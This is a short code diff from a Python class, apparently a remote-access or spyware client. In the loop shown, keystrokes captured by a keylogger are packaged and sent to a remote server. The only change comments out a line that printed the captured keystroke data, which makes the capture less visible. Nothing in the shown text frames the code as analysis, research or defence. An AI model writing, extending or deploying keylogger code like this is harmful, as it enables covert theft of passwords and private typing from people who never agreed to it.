@@ -342,7 +342,7 @@ class ALA:
                 #agl ____keylogger____
                 keylogger.build_data()
                 keylogger_data = keylogger.get_built_data()
-                print(keylogger_data)
+                #? print(keylogger_data)
                 keylogger.clear_data()
 
                 await self.send_data(command = Commands.keylogger_data, data = keylogger_data) #! send data to server
